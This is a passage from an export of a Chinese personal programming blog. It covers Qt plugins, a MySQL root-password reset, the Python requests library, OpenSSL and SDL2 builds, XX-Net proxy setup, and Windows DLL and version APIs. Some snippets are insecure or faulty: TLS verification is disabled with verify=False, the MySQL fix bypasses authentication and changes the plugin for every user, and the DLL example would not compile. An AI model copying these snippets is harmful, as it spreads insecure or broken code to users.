表明要构建一个插件TARGET 指定生成的.dll 或 .so 文件名DESTDIR 指定生成的.dll 或 .so 文件所在的目录 最后还要把本地部署改为Release，然后在构建该项目即可生成指定的库文件，比如我的是 libmytestPlugin.so 测试插件为了做一个简单的测试，我另外创建了一个项目，调用插件也很简单，这里给出核心代码 123456789101112131415161718192021222324//用QPluginLoader加载动态链接库，注意QLibrary类与QPluginLoader类的区别#include&lt;QPluginLoader&gt;#include"mytestplugininterface.h"void Dialog::loadmyPlugin()&#123; QPluginLoader *loader=new QPluginLoader(this); //把插件文件和包含插件声明的文件放到项目下 loader-&gt;setFileName("libmytestPlugin.so"); //判断加载插件是否成功 if(!loader-&gt;load())&#123; qDebug()&lt;&lt;"Error:"&lt;&lt;loader-&gt;errorString(); return; &#125; //遍历插件的元数据信息 foreach (QString key,loader-&gt;metaData().keys()) &#123; qDebug()&lt;&lt;key&lt;&lt;"\t"&lt;&lt;loader-&gt;metaData().value(key); &#125; QObject*plugin= loader-&gt;instance(); //转换获取插件类对象 MyTestPluginInterface *mytestpliugin=qobject_cast&lt;MyTestPluginInterface*&gt;(plugin); mytestpliugin-&gt;helloworld("Google..."); //卸载插件 loader-&gt;unload();&#125; ok，到此基本上完成了一个简单的插件使用了 ：)]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql error 1524-unix_socket]]></title>
    <url>%2Fmysql-error-unix-socket%2F</url>
    <content type="text"><![CDATA[在登录MySQL时显示错误 mysql &quot;ERROR 1524 (HY000): Plugin &#39;unix_socket&#39; is not loaded&quot; 参考原文: https://askubuntu.com/questions/705458/ubuntu-15-10-mysql-error-1524-unix-socket 解决办法 /etc/init.d/mysql stopsudo killall mysqld_safesudo killall mysqldsudo mysqld_safe –skip-grant-tables &amp;mysql -u rootuse mysql;update user set password=PASSWORD(“MySQL密码”) where User=’root’;update user set plugin=”mysql_native_password“;quit;/etc/init.d/mysql stopsudo kill -9 $(pgrep mysql)/etc/init.d/mysql start 这是原文，挺详细的… The “unix_socket” has been called by mysql authentication process (maybe related to a partial migration of database to mariadb, now removed). To get all stuff back working go su: sudo su then follow: /etc/init.d/mysql stopmysqld_safe –skip-grant-tables &amp;mysql -uroot This will completely stop mysql, bypass user authentication (no password needed) and connect to mysql with user “root”. Now, in mysql console, go using mysql administrative db: use mysql; To reset root password to mynewpassword (change it at your wish), just to be sure of it: update user set password=PASSWORD(“mynewpassword”) where User=’root’; And this one will overwrite authentication method, remove the unix_socket request (and everything else), restoring a normal and working password method: update user set plugin=”mysql_native_password”; Exit mysql console: quit; Stop and start everything related to mysql: /etc/init.d/mysql stopkill -9 $(pgrep mysql)/etc/init.d/mysql startDon’t forget to exit the su mode. Now mySQL server is up and running. You can login it with root: mysql -u root -p or whatever you wish. Password usage is operative. That’s it.]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python requests模块]]></title>
    <url>%2Fpython-requests%2F</url>
    <content type="text"><![CDATA[Python里有自带的 urllib 库,提供了许多强大的功能来获取URL信息,而 urllib2 则提供了一组基于请求(request)的功能.两者可以相铺相成.而今天的主角是第三方库 requests ,其以简单的方式去获取URL,复杂性没有urllib高 获取requests最简单的方法就是 pip install requests ,然后就可以使用了 发送请求首先,需要导入 Requests 模块,这里就介绍 get 函数 12345678910def get(url, params=None, **kwargs): r"""Sends a GET request. :param url: URL for the new :class:`Request` object. :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`. :param \*\*kwargs: Optional arguments that ``request`` takes. :return: :class:`Response &lt;Response&gt;` object :rtype: requests.Response """ kwargs.setdefault('allow_redirects', True) return request('get', url, params=params, **kwargs) 可以看到 requests.get 函数 实际是调用了 requests.Request 构造请求参数,并返回一个 requests.Response 响应对象 类似的,还有 put,delete,head,post,option 请求函数 例11234567891011121314151617 query=&#123;'test1':'123456789','test2':'123456789'&#125; r=requests.get(url='https://www.baidu.com',params=query) print r.url #返回URL地址 print r.status_code #返回状态码 print r.encoding #编码格式 print r.headers['Content-Type'] #获取网页header print r.cookies #获取cookies print r.text #Requests自动解码后数据 print r.content #获取二进制响应内容 print r.json() #JSON 响应内容 可以和 json 模块使用输出:https://www.baidu.com/?test1=123456789&amp;test2=123456789200ISO-8859-1text/html&lt;RequestsCookieJar[&lt;Cookie BDORZ=27315 for .baidu.com/&gt;]&gt; 返回数据太多,这里不显示了 注意,get函数的params为查询字符串 例21234567891011121314151617181920212223242526 user_agent = 'Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36' headers = &#123;'User-Agent': user_agent&#125; data=&#123;'key1':'hello','key2':'world'&#125; r=requests.post(url='http://httpbin.org/post',headers=headers,data=data) print r.text 输出:&#123; "args": &#123;&#125;, "data": "", "files": &#123;&#125;, "form": &#123; "key1": "hello", "key2": "world" &#125;, "headers": &#123; "Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Content-Length": "21", "Content-Type": "application/x-www-form-urlencoded", "Host": "httpbin.org", "User-Agent": "Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36" &#125; ... 这是一个 POST 请求 ,其中 data 参数表示要提交给服务器的数据 ,headers 是一个字典类型的请求头,此处我只指定了 User-Agent . 代理访问为了访问一些被Q的网站,往往需要设置代理,幸运的是,requests同样也提供的代理这一功能,与之有关的参数为 proxies 例312345proxy=&#123;'http':'http://127.0.0.1:8087', 'https':'http://127.0.0.1:8087'&#125;r=requests.get(url='https://www.google.com',proxies=proxy,verify=False)print r.textprint r.status_code 如果代理需要账户和密码, 则 123proxies=&#123; "http": "http://username:password@127.0.0.1:8087"&#125; 我把 verify 设置为 False,是为了SSL证书验证. 也可以通过环境变量 HTTP_PROXY 和 HTTPS_PROXY 来配置代理 12345$ export HTTP_PROXY="http://10.10.1.10:3128"$ export HTTPS_PROXY="http://10.10.1.10:1080"$ python&gt;&gt;&gt; import requests&gt;&gt;&gt; requests.get("http://example.org") 会话(Session)会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 urllib3 的 connection pooling 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 HTTP persistent connection ). 使用之前需导入类: from requests import Session 准备的请求(Prepared Request)当你从 API 或者会话调用中收到一个 Response 对象时，request 属性其实是使用了 PreparedRequest。有时在发送请求之前，你需要对 body 或者 header （或者别的什么东西）做一些额外处理 例4123456789101112131415user_agent = 'Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko)Chrome/59.0.3071.115 Safari/537.36' headers=&#123;'User-Agent':user_agent&#125; # 开启回话 s= requests.Session() req=requests.Request('GET',url='http://baidu.com') # 开始准备一个请求 prepped= s.prepare_request(req) # do something with prepped.body # do something with prepped.headers prepped.prepare_headers(headers) # 发送以准备好的请求 resp= s.send(prepped,timeout=5) print resp.status_code s.close() 事件挂钩Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理 可用的钩子:response :从一个请求产生的响应 可以通过传递一个 {hook_name: callback_function} 字典给 hooks 请求参数为每个请求分配一个钩子函数： 1hooks=dict(response=print_url) callback_function 会接受一个数据块作为它的第一个参数 12def print_url(r, *args, **kwargs): print(r.url) 例51234567891011121314def print_urls(r,*args,**kwargs): print r.url passif __name__=='__main__': s=requests.Session() # 钩子 s.hooks=dict(response=print_urls) req= requests.Request('GET',url='https://www.github.com',headers=header) pre=s.prepare_request(req) pre.prepare_headers(header) resp=s.send(pre) print resp.headers pass 参考 http://docs.python-requests.org/zh_CN/latest/user/quickstart.html good~]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下Qt发生错误qt.network.ssl:QSslSocket:cannotresolve...]]></title>
    <url>%2Flinux-qt-network-ssl%2F</url>
    <content type="text"><![CDATA[在Linux上Qt使用network时出现错误: qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_client_method qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_client_method qt.network.ssl: QSslSocket: cannot resolve TLSv1_1_server_method qt.network.ssl: QSslSocket: cannot resolve TLSv1_2_server_method qt.network.ssl: QSslSocket: cannot resolve SSL_select_next_proto qt.network.ssl: QSslSocket: cannot resolve SSL_CTX_set_next_proto_select_cb qt.network.ssl: QSslSocket: cannot resolve SSL_get0_next_proto_negotiated qt.network.ssl: QSslSocket: cannot call unresolved function SSL_get0_next_proto_negotiated 经网上查阅,大概知道了原因,就是要自己重新编译openssl.第一次用的是1.1版本的,发现还是解决不了,于是下了1.0.1的.&gt;&gt;链接 wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1.tar.gztar zxvf openssl-1.0.1.tar.gzcd openssl-1.0.1/./config enable-sharedmake 在 openssl-1.0.1 目录下生成了so文件,复制到Qt安装目录lib下 cp libcrypto.so libcrypto.so.1.0.0 libssl.so libssl.so.1.0.0 /opt/Qt5.6.2/5.6/gcc_64/lib 然后ok]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决Qt5 qDebug()不显示调试信息]]></title>
    <url>%2Fqt-qdebug%2F</url>
    <content type="text"><![CDATA[之前不知怎么,Qt qDebug() 无法输出调试信息,不过诸如qWarning() qCritical() 可以正常输出 方法之前我是用 qInstallMessageHandler(QtMessageHandler) 捕获信息,同样也是无法输出 qDebug() 的信息. 最后还是在Qt官网论坛发出帖子寻求帮助https://forum.qt.io/topic/86358/qdebug-can-t-output-text 从这个网站找到解决方法 https://brendanwhitfield.wordpress.com/2016/06/08/enabling-qdebug-on-fedora/ When writing Qt applications, it’s helpful to use a qDebug() statement once in a while. However, I’ve recently found that qDebug() on stock Fedora no longer prints, while qWarning() does. The first thing that the internet tells you is to add CONFIG += console to your .pro file, but alas, this is not the solution. It turns out, because of the way Qt is setup on Fedora, debug output is no longer emitted on stderr (by design). Thanks to this bug report, the solution is to create the following file in either of these locations: ~/.config/QtProject/qtlogging.ini (for your user only) /etc/xdg/QtProject/qtlogging.ini (system-wide) [Rules].debug=trueqt..debug=false The first rule enables all debug output, while the second disables Qt’s internal debug statements. This prevents a deluge of output from Qt when debugging your application. 我修改 /etc/xdg/QtProject/qtlogging.ini 文件为 *[Rules] .debug=trueqt.*.debug=false bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDL2显示PNG图片+播放MP3]]></title>
    <url>%2Fsdl2-png-mp3%2F</url>
    <content type="text"><![CDATA[在使用SDL时，发现就算编译安装了SDL2_image和SDL_mixer也无法显示png格式图片和播放MP3音频文件。在网上搜索许久，这里总结一下编译过程。。。 SDL2_image首先，我是用一下函数获取错误的信息的 12_texture=IMG_LoadTexture(_renderer,filename.c_str());cout&lt;&lt; SDL_GetError()&lt;&lt;endl; 错误信息如下：Failed loading png_set_longjmp_fn: /lib/x86_64-linux-gnu/libpng12.so.0: undefined symbol: _png_set_longjmp_fn 可看到，libpng12.so 这个库文件位定义函数符号 png_set_longjmp_fn 接着我查找 libpng12.so 这个库文件 1234567$ locate libpng|grep &quot;so&quot;/lib/x86_64-linux-gnu/libpng12.so.0/lib/x86_64-linux-gnu/libpng12.so.0.49.0/usr/lib/x86_64-linux-gnu/libpng.so/usr/lib/x86_64-linux-gnu/libpng16.so/usr/lib/x86_64-linux-gnu/libpng16.so.16/usr/lib/x86_64-linux-gnu/libpng16.so.16.34.0 可看到系统存在两个版本的 libpng 库 。如果只存在一个，那么可以自行下载libpng最新版本编译安装，并继续以下操作。其中 libpng12.so.0.49.0 是一个比较老的版本了。所以与最新的SDL2可能不兼容，才会出现上面的那个错误。知道的问题后，解决起来似乎也变得简单了。。。 显示12版本 dynamic symbols $ nm -D /lib/x86_64-linux-gnu/libpng12.so.0|grep png_set_longjmp_fn 显示16版本 dynamic symbols $ nm -D /usr/lib/x86_64-linux-gnu/libpng.so|grep png_set_longjmp_fn结果：000000000000a840 T png_set_longjmp_fn 所以，解决方法很简单，删除旧的库文件，替换成新的。不过最后我发现了一个奇怪的问题，那就是在从 /lib/x86_64-linux-gnu 路径去除libpng12.so.0这个旧版本的库时，virtualbox虚拟机启动显示 创建COM对象失败 。最后重新编译安装了libpng12.so.0并复制到 /lib/x86_64-linux-gnu 目录下才可以！ cp /usr/lib/x86_64-linux-gnu/libpng16.so.16.34.0 /lib/x86_64-linux-gnu/ln -s /lib/x86_64-linux-gnu/libpng16.so.16.34.0 /lib/x86_64-linux-gnu/libpng16.so #添加软链接 之后重新编译 SDL2_image ./configuremakemake install SDL_mixer通过 ./configure –help 查看配置选项。要想支持播放MP3格式，只需添加以下配置参数 ./configure –enable-music-mp3 –enable-music-mp3-mad-gplmakemake insatll ldd build/.libs/libSDL2_mixer.so 123456789linux-vdso.so.1 (0x00007ffc71f8d000)libSDL2-2.0.so.0 =&gt; /usr/local/lib/libSDL2-2.0.so.0 (0x00007f07ed821000)libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f07ed5f2000)libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f07ed3d4000)librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007f07ed1cc000)libmad.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libmad.so.0 (0x00007f07ecfac000)libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f07ecc99000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f07ec8f4000)/lib64/ld-linux-x86-64.so.2 (0x0000557697c43000) 这样就OK了 :)]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Linux</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XX-NET搭建FQ环境]]></title>
    <url>%2Flinux-xxnet%2F</url>
    <content type="text"><![CDATA[我是在Linux下搭建的,不过其他系统也是一样的.由于搭建FQ过程比较复杂的,所以这里列举几个工具:下载Google chrome使用lantern蓝灯创建GAE并申请appidXX-NET配置 PS： 以下方法可能比较旧，目前我使用的是X-Tunnel 正文 需要 作用 Chrome浏览器 – lantern 访问Google XX-NET 主要工具 GAE 代理服务器 SwitchOmega 管理和切换多个代理设置 下载Google chrome建议去官网下载,所以这里就要用到lantern了安装略 :) 使用lantern蓝灯使用lantern蓝灯 到github获取 https://github.com/getlantern/forum 我的是Linux系统下载之后就可以 dpkg -i来安装了,然后可以直接 lantern 运行,并显示一个托盘图标.可以 netstat -ntlp |grep lantern 来查看lantern进场监听的端口. 别说这访问速度还挺快的.不过,体验版lantern用户每个月只能用几百MB的流量,超过后就不能用了(省点用啊),所以,特么的看个视频就没了…基于此,我决定折腾一番… 创建GAE并申请appid其实,到了这里就是注意了,这才是最主要的.GAE(Google APP Engine)是什么?以下摘自百度 Google App Engine 是一种让您可以在 Google 的基础架构上运行您的网络应用程序。Google App Engine 应用程序易于构建和维护，并可根据您的访问量和数据存储需要的增长轻松扩展。使用 Google App Engine，将不再需要维护服务器：您只需上传您的应用程序，它便可立即为您的用户提供服务。 PS:必须去创建一个Google账号,此处不在赘述gae官网: https://appengine.google.com输入Google账号密码之后就可以进去gae管理界面了 之后可以直接创建项目了,注意那个appid就是项目名 等待创建完成 完成之后只需吧那个appid记住. PS:可以创建多个项目.在配置xx-net时也可以指定多个appid,一个appid对应1G的使用流量 XX-NET配置可以在 https://github.com/XX-net/XX-Net 下载 XX-NET直接 git clone https://github.com/XX-net/XX-Net.git 或者在这里下载: https://github.com/XX-net/XX-Net/blob/master/code/default/download.md中文帮助文档: https://github.com/XX-net/XX-Net/wiki/%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3 下载之后 123unzip XX-Net-3.8.0.zipcd XX-Net-3.8.0./start #后台运行 PS:建议在配置XX-NET之前,后台运行lantern,因为等下部署时要登录Google账号 我在Linux下配置时还要开启ipv6通道 .方法如下 12345678910111213apt-get install miredomiredo #运行ifconfig可以看到多出一个`teredo`接口teredo: flags=4305 mtu 1280inet6 2001:0:53aa:64c:2c46:bf0:e4db:1ac5 prefixlen 32 scopeid 0x0inet6 fe80::707:2c4a:7df6:4104 prefixlen 64 scopeid 0x20inet6 fe80::ffff:ffff:ffff prefixlen 64 scopeid 0x20unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC)RX packets 2828 bytes 1820077 (1.7 MiB)RX errors 0 dropped 0 overruns 0 frame 0TX packets 3687 bytes 397036 (387.7 KiB)TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 XX-NET主界面 部署服务端–&gt;配置–&gt;查看状态 部署服务端多个appid用 “|” 分割,之后可以[开始部署],再次强调一下,那个appid就是项目名 之后会跳转到登录Google账号的窗口.登录ok后等待部署完成 配置之后在GAE AppID输入自己的appid 状态确保每次配置时查看是否配置成功!如果出现 请检查浏览器代理设置。表示配置成功了,只是还需要 “设置代理，是为了让你的浏览器或者其他应用程序知道XX-Net的存在，这样他们才会通过XX-Net科学上网。” 解决方法具体方法可以查看 https://github.com/XX-net/XX-Net/wiki/%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86 由于我目前是Linux系统,所以 我用 Chrome+SwitchOmega(管理和切换多个代理设置) 可以在chrome浏览器应用商店安装SwitchOmega拓展程序 然后打开SwitchOmega选项–&gt;导入/导出–&gt;从备份文件恢复导入OmegaOptions.bak文件,此文件位置在 …/XX-Net-3.8.0/SwitchyOmega/ 目录下 之后可以看到一下几个选项 然后选择gae服务器代理.恢复正常可以切换回 [系统代理] 然后再看看XX-NET配置状态,成功!现在可以关闭lantern了,然后再去试试看能不能打开 https://www.google.com 吧! 去浪吧~ :&gt;]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows XX-NET使用]]></title>
    <url>%2Fwindows-xxnet%2F</url>
    <content type="text"><![CDATA[本章讲述Windows下怎么快速的搭建FQ环境,同样是用XX-NET同样的,还是到github获取xx-net.本文的重点是在Windows上开始 IPv6 .在未开启ipv6首次打开xx-net时,会显示 尚未建立连接. PS： 以下方法可能比较旧，目前我使用的是X-Tunnel 开启ipv6直接在 cmd命令提示符 下输入一下命令 1234//teredo服务器：teredo-debian.remlab.netnetsh interface teredo set state server=teredo-debian.remlab.netnetsh int ter set state enterpriseclientnetsh int ipv6 show teredo //查看状态 Teredo 参数-——————————————–类型 : enterpriseclient服务器名称 : teredo-debian.remlab.net客户端刷新间隔 : 30 秒客户端端口 : unspecified状态 : qualified客户端类型 : teredo client网络 : unmanagedNAT : restrictedNAT 特殊行为 : UPNP: 是，PortPreserving: 否本地映射 : 192.168.1.103:64530外部 NAT 映射 : xxx.xxx.xxx.xxx:23441 恢复teredo断开连接的话,可以直接 退出 xx-net,还需在cmd下输入一下命令即可 123//恢复teredonetsh interface teredo set state default server=defaultnetsh int ipv6 show teredo //查看状态 Teredo 参数-—————————————–类型 : client服务器名称 : teredo.ipv6.micr客户端刷新间隔 : 30 秒客户端端口 : unspecified状态 : offline错误 : 未能解析服务器名 IE浏览器代理设置 默认情况下,IE浏览器时没有设置代理,所以也就无法访问一些网站.这里介绍两种方法 Internet选项(LAN)设置打开IE浏览器&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;局域网(LAN)设置,之后 勾选 代理服务器之一,并填入 地址 和 端口 ,其中地址默认 127.0.0.1 ,端口可以从 GAEProxy状态信息 &gt;&gt; 配置 属性里的 监听代理 为 8087 花刺代理(ProxyThorn)添加代理 填入gae的服务器地址以及端口 先验证再设为IE代理 然后在次刷新IE浏览器即可再次看到Google主页! bye]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gnome gedit配置]]></title>
    <url>%2Flinux-gnome-setting%2F</url>
    <content type="text"><![CDATA[不知什么原因,gedit找不到首选项,所以也无法直接修改配置,经一番琢磨,记录下过程… gsettings本文用到此工具,用它来查询,修改 Gnome桌面环境配置 ,关于它的用法可以直接查看帮助文档比如 gsettings list-recursively 就会输出很多信息 ……org.gnome.gnome-system-monitor.proctree col-20-visible falseorg.gnome.gnome-system-monitor.proctree col-10-visible falseorg.gnome.gnome-system-monitor.proctree col-6-width 90org.gnome.gnome-system-monitor.proctree col-22-visible trueorg.gnome.gnome-system-monitor.proctree col-14-visible falseorg.gnome.gnome-system-monitor.proctree col-13-visible falseorg.gnome.gnome-system-monitor.proctree col-11-visible falseorg.gnome.gnome-system-monitor.proctree col-7-width 90org.gnome.gnome-system-monitor.proctree col-16-visible falseorg.gnome.gnome-system-monitor.proctree col-15-visible trueorg.gnome.gnome-system-monitor.proctree col-10-width 70org.gnome.gnome-system-monitor.proctree col-8-width 71org.gnome.gnome-system-monitor.proctree col-18-visible falseorg.gnome.GWeather distance-unit ‘km’…… 获取关于 gedit 的配置信息 gsettings list-recursively |grep org.gnome.gedit.preferences.editor 就会输出很多 键值对 . 显示行号 gsettings set org.gnome.gedit.preferences.editor display-line-numbers true 高亮当前行 gsettings set org.gnome.gedit.preferences.editor highlight-current-line true 右侧预览 gsettings set org.gnome.gedit.preferences.editor display-overview-map true 修改主题其中主题文件为xml格式,位于 /usr/share/gtksourceview-3.0/styles ,可以在 https://github.com/mig/gedit-themes 获取额外的主题文件. gsettings set org.gnome.gedit.preferences.editor scheme oblivion 其中 oblivion 为主题文件名(除去后缀.xml) 修改字体在修改字体之前一定要把使用默认字体的设为false ! 不然不会生效 gsettings set org.gnome.gedit.preferences.editor use-default-font falsegsettings set org.gnome.gedit.preferences.editor editor-font “Monospace 11” Monospace为字体名称 , 11 为字体大小,之前要有空格 结尾最后,bye……]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GNOME</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WindowsAPI获取操作系统主次版本号]]></title>
    <url>%2Fwindows-getosversion%2F</url>
    <content type="text"><![CDATA[列举了一些目前所知道的方法来获取Windows操作系统版本号 方法1 RtlGetNtVersionNumbers 12345678910//定义函数指针typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);//载入模块HMODULE hmod= LoadLibraryA("ntdll.dll");//获取函数地址NTPROC RtlGetNtVersionNumbers = (NTPROC)GetProcAddress(hmod, "RtlGetNtVersionNumbers"); DWORD dwMajor, dwMin, dwOpt; RtlGetNtVersionNumbers(&amp;dwMajor, &amp;dwMin, &amp;dwOpt); //卸载模块 FreeLibrary(hmod); 方法2 GetVersion 1234567DWORD dwVersion= GetVersion();//低16位WORD lwo = LOWORD(dwVersion);BYTE minor = HIBYTE(lwo); //次版本号BYTE major = LOBYTE(lwo); //主版本号if (major ==10) SetWindowText(L"Windows 10");if (major ==6) SetWindowText(L"Windows 7"); 方法3 GetVersionEx 123456789101112131415BOOL GetVersionEx(POSVERSIONINFO pVersionInformation); typedef struct &#123; DWORD dwOSVersionInfoSize; //在使用GetVersionEx之前要将此初始化为结构的大小 DWORD dwMajorVersion; //系统主版本号 DWORD dwMinorVersion; //系统次版本号 DWORD dwBuildNumber; //系统构建号 DWORD dwPlatformId; //系统支持的平台 TCHAR szCSDVersion[128]; //系统补丁包的名称 WORD wServicePackMajor; //系统补丁包的主版本 WORD wServicePackMinor; //系统补丁包的次版本 WORD wSuiteMask; //标识系统上的程序组 BYTE wProductType; //标识系统类型 BYTE wReserved; //保留,未使用 &#125;OSVERSIONINFOEX, *POSVERSIONINFOEX; 注意,使用该函数在Windows8和Windows10之间获取的是同一个主次版本号,所以,要在项目添加一个清单文件(manifest)配置属性-&gt;清单工具-&gt;输入和输出-附加清单文件,填写manifest.xml manifest.xml文件内容 1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt; &lt;compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"&gt; &lt;application&gt; &lt;!-- Windows 10 --&gt; &lt;supportedOS Id="&#123;8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a&#125;"/&gt; &lt;!-- Windows 8.1 --&gt; &lt;supportedOS Id="&#123;1f676c76-80e1-4239-95bb-83d0f6d0da78&#125;"/&gt; &lt;!-- Windows Vista --&gt; &lt;supportedOS Id="&#123;e2011457-1546-43c5-a5fe-008deee3d3f0&#125;"/&gt; &lt;!-- Windows 7 --&gt; &lt;supportedOS Id="&#123;35138b9a-5d96-4fbd-8e2d-a2440225f93a&#125;"/&gt; &lt;!-- Windows 8 --&gt; &lt;supportedOS Id="&#123;4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38&#125;"/&gt; &lt;/application&gt; &lt;/compatibility&gt; &lt;/assembly&gt; 法4 PsGetVersion,在内核驱动程序中调用该函数 12345678910BOOLEAN PsGetVersion( PULONG MajorVersion OPTIONAL, PULONG MinorVersion OPTIONAL, PULONG BuildNumber OPTIONAL, PUNICODE_STRING CSDVersion OPTIONAL);MajorVersion 是主版本号MinorVersion 是副版本号BuildNumber 是build版本号，如7600等CSDVersion 存放着SP1、SP2等信息]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++编写动态链接库Dll+调用Dll]]></title>
    <url>%2Fcpp-call-dll%2F</url>
    <content type="text"><![CDATA[前言 动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。使用动态链接库可以更为容易地将更新应用于各个模块，而不会影响该程序的其他部分。例如，您有一个大型网络游戏，如果把整个数百MB甚至数GB的游戏的代码都放在一个应用程序里，日后的修改工作将会十分费时，而如果把不同功能的代码分别放在数个动态链接库中，您无需重新生成或安装整个程序就可以应用更新 正文本文就Windows下创建一个dll动态库并调用 打开VS2013，新建一个C++工程（不是MFC！），命名为 “mydll”，接着选中 “DLL”，”导出符号”，直接完成 这时，看到的是默认初始化好了的代码，我们把一些不必要的删掉（其实那些是用来参考的，实际编写时删掉也无大碍）。然后在“mydll.h”头文件里添加 下列代码： 12extern "C" MYDLL_API int _stdcall GetMaxNumber(int, int);extern "C" MYDLL_API void _stdcall ShowMsg(char *, char*); 在“mydll.cpp”源文件添加 如下图所示的功能实现代码： 12345678extern "C" MYDLL_API int _stdcall GetMaxNumber(int, int)&#123; return a&gt;b?a*100:b;&#125;extern "C" MYDLL_API void _stdcall ShowMsg(char * text, char* title)&#123; MessageBoxA(NULL,text,title,MB_OK);&#125; OK!现在代码简简单单的写完了，那如何编译成 .dll 文件呢？单击菜单栏 &gt;”生成”&gt;”生成 mydll”，编译成功。（注意，不是 调试下的开始执行…）然后找到工程的目录所在路径，DeBug目录下找到 那个生成的 “mydll.dll”（现在是不是很激动呢 :) 测试 在重新创建一个工程，这次是一个C++下的控制台应用程序来测试编写的dll是否成功运行！！工程名为“test_mydll” 添加一个.cpp源文件，添加如下代码：（注意，要把 mydll.dll 放到 生成的.exe 同一目录下） 12345678910111213141516171819#include &lt;windows.h&gt;//全局...typedef int(_stdcall *pGetMaxN)(int, int); //定义一个函数指针类型typedef void(_stdcall *pShowMsg)(char *, char *);main()...//动态加载 dllHMODULE hModule = LoadLibrary(L"mydll.dll");if (!hModule)&#123;cout &lt;&lt; "Error!" &lt;&lt; endl;&#125;//获取函数 GetMaxNumber 的地址pGetMaxN pgetm = (pGetMaxN)GetProcAddress(hModule, "GetMaxNumber");cout &lt;&lt; pgetm(10, 5) &lt;&lt; endl;//获取函数 ShowMsg 的地址pShowMsg pshowm = (pShowMsg)GetProcAddress(hModule, "ShowMsg");pshowm("内容", "标题");//释放FreeLibrary(hModule); 这里要提醒一下哦，上面的是动态加载dll的，所以，就也是说，我们一直都没有使用原来的dll工程生成了那个“mydll.lib”的文件！那么现在以静态调用dll 也是可行的，但 要把那个.lib文件和 .h头文件放到 与.cpp 同一个目录下（注意，这个不是.dll文件，所以可以放在 与.cpp同一个目录下！！！！） 然后，可以放心的吧以前动态调用的代码注释掉啦，添加新代码 123456// 动态typedef int( _stdcall *pGetMaxN)(int, int); //定义一个函数指针类型typedef void( _stdcall *pShowMsg)(char *, char *);// 静态extern "C" __declspec(dllimport) int _stdcall GetMaxNumber(int, int);extern "C" __declspec(dllimport) void _stdcall ShowMsg(char *, char*); Bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt注册热键QHotkey]]></title>
    <url>%2Fqt-reg-hotkey%2F</url>
